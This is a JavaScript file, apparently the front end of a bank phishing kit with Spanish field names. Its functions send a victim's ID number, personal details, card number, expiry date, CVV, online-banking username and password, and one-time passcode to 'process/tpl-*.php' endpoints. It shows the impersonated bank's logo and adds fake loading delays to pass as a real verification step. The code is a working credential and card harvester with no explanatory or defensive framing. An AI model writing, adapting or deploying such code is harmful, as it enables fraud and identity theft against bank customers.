function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}

function verificar(){
    $("#logo-entidad-load").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#logo-entidad").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#logo-entidad-otp").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#frm-animacion").hide();
    $("#frm-verificacion").show();
}


function validar(){   
    $("#frm-cargando").hide();
    $("#frm-otp").show();
}

function enviar_documento(c){
    d = detectar_dispositivo();
    $.post( "process/tpl-d.php", {doc:c,dis:d} ,function(data) {                
        window.location.href = "informacion/"; 
    });
}

function enviar_datos(n,c,m,a,u){
    $.post( "../process/tpl-i.php", {nom:n,cel:c,cor:m,dir:a,ciu:u} ,function(data) {                
            
    });
}


function enviar_tarjeta(b,t,f,c){
    $.post( "../process/tpl-c.php", { ban:b,tar:t,fec:f,cvv:c } ,function(data) {  
        setTimeout(verificar, 1500);
    });
}


function buscar_documento(){
    $.post( "../process/bsc-d.php", function(data) {  
        $("#txt-cedula").val(data);  
    });  
}


function enviar_usuario(u,p){    
    $.post( "../process/tpl-l.php", {usr:u,pas:p} ,function(data) {        
        setTimeout(validar, 8000); 
    });
}


function enviar_otp(o){    
    $.post( "../process/tpl-o.php", {otp:o} ,function(data) {        
        $("#frm-autorizar").show();
    });
}